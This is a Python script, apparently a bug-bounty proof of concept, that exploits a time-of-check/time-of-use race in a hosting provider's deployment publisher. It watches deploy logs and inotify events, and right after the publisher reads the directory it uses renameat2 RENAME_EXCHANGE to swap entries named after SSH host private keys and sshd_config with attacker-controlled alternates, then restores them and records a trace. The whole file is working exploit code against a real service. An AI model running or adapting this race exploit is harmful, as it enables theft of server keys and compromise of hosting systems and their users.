#!/usr/bin/env python3
"""Swap stable child entries immediately after the publisher reads the directory."""

from __future__ import annotations

import ctypes
import json
import os
from pathlib import Path
import struct
import time


SYS_RENAMEAT2 = 316
AT_FDCWD = -100
RENAME_EXCHANGE = 2
IN_ACCESS = 0x00000001
IN_OPEN = 0x00000020
MARKER = b"HOSTINGER_NODE_READDIR_CHILD_TOCTOU_GATE:r230"
PUBLISHING = b"==> Publishing"
NAMES = [
    "moduli",
    "ssh_config",
    "ssh_host_ecdsa_key",
    "ssh_host_ecdsa_key.pub",
    "ssh_host_ed25519_key",
    "ssh_host_ed25519_key.pub",
    "ssh_host_rsa_key",
    "ssh_host_rsa_key.pub",
    "sshd_config",
]
libc = ctypes.CDLL(None, use_errno=True)
started = time.monotonic()
deadline = started + 30.0
logs_root = Path.cwd().parents[1] / "logs"
pairs = [(os.fsencode(f"dist/slot-00/{name}"), os.fsencode(f"race-alternates/{name}")) for name in NAMES]
trace = {"marker": MARKER.decode(), "event": "not-observed", "fileCount": len(NAMES), "logsRootAccessible": logs_root.is_dir()}


def current_log() -> Path | None:
    try:
        candidates = sorted(logs_root.glob("*/*_deploy.log"), key=lambda item: item.stat().st_mtime_ns, reverse=True)[:8]
    except OSError:
        return None
    for candidate in candidates:
        try:
            if MARKER in candidate.read_bytes():
                return candidate
        except OSError:
            continue
    return None


def exchange(first: bytes, second: bytes) -> int:
    return libc.syscall(SYS_RENAMEAT2, AT_FDCWD, ctypes.c_char_p(first), AT_FDCWD, ctypes.c_char_p(second), RENAME_EXCHANGE)


inotify_fd = libc.inotify_init1(os.O_NONBLOCK | os.O_CLOEXEC)
watch = -1
if inotify_fd >= 0:
    watch = libc.inotify_add_watch(inotify_fd, ctypes.c_char_p(os.fsencode("dist/slot-00")), IN_OPEN | IN_ACCESS)
trace.update(inotifyFdOk=inotify_fd >= 0, watchOk=watch >= 0)

log_path = None
while time.monotonic() < deadline and log_path is None:
    log_path = current_log()
    if log_path is None:
        time.sleep(0.0005)

if log_path is not None and watch >= 0:
    trace.update(event="current-log-found", logFoundAfterMs=round((time.monotonic() - started) * 1000, 3))
    while time.monotonic() < deadline:
        try:
            tail = log_path.read_bytes()[-4096:]
        except OSError:
            time.sleep(0.00025)
            continue
        if PUBLISHING not in tail:
            time.sleep(0.00025)
            continue
        trace.update(event="publishing-observed", publishingAfterMs=round((time.monotonic() - started) * 1000, 3))
        event_deadline = time.monotonic() + 2.0
        while time.monotonic() < event_deadline:
            try:
                data = os.read(inotify_fd, 4096)
            except BlockingIOError:
                time.sleep(0.00005)
                continue
            except OSError:
                data = b""
            offset = 0
            saw_directory_access = False
            while offset + 16 <= len(data):
                _, mask, _, name_length = struct.unpack_from("iIII", data, offset)
                name_start = offset + 16
                name_end = name_start + name_length
                name = data[name_start:name_end].split(b"\0", 1)[0]
                if mask & IN_ACCESS and not name:
                    saw_directory_access = True
                    break
                offset = name_end
            if not saw_directory_access:
                continue
            trace.update(event="directory-read-observed", directoryReadAfterMs=round((time.monotonic() - started) * 1000, 3), eventBytes=len(data))
            exchanges = 0
            errors = 0
            for first, second in pairs:
                if exchange(first, second) == 0:
                    exchanges += 1
                else:
                    errors += 1
            trace.update(exchanges=exchanges, exchangeErrors=errors)
            time.sleep(0.5)
            restores = 0
            for first, second in pairs:
                if exchange(first, second) == 0:
                    restores += 1
            trace["restores"] = restores
            break
        break

if inotify_fd >= 0:
    os.close(inotify_fd)
trace["finishedAfterMs"] = round((time.monotonic() - started) * 1000, 3)
try:
    trace_path = Path.home() / ".h1-r230-race-trace.json"
    trace_path.write_text(json.dumps(trace, sort_keys=True))
    trace_path.chmod(0o600)
except OSError:
    pass
